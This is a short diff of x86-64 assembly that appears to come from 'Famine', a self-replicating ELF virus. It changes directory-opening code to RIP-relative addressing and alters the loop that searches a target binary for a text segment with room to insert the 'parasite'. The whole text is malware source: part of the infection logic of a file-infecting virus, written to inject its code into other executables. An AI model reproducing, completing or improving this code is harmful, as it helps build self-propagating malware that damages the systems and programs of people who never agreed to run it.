@@ -10,7 +10,7 @@ _start:
 
     ; placing famine on the stack
     mov rbp, rsp
-    mov rdi, dir1                                   ; dir to open for arg readDir
+    lea rdi, [rel dir1]                                   ; dir to open for arg readDir
     mov rsi, dir1Len
     call _readDir
 
@@ -21,7 +21,7 @@ _start:
     ; writeBack
     ; writeBack
 
-    mov rdi, dir2
+    lea rdi, [rel dir2]
     mov rsi, dir2Len
     call _readDir
 	_final_jmp:
@@ -168,7 +168,7 @@ _check_file:
 			add rbx, [r14 + elf64_phdr.p_filesz]
 			add rbx, CODE_LEN						; rbx = offset end of futur parasite
 			cmp [r13], rbx							; if (next_phdr.offset <= offset_end_parasite)
-			jle	_segment_loop
+			jle	_continue
 
 	; === found text segment ===
 	_valid_seg_found:
